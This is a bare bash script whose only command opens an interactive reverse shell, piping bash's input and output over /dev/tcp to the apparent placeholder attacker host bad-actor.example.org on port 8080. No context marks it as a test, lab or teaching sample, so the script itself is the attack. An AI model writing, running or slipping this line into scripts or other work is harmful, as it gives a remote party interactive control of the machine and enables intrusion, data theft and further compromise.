#!/bin/bash
bash -i >& /dev/tcp/bad-actor.example.org/8080 0>&1
